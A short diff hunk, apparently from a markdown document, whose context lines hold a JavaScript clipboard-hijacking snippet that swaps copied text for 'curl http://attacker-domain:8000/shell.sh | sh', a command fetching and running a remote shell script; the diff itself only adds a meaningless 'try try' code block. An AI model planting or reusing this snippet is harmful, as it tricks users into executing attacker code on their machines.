@@ -14,3 +14,6 @@ You can click the Preview link to take a look at your changes.
    document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
 </script>
 ```
+```
+try try
+```
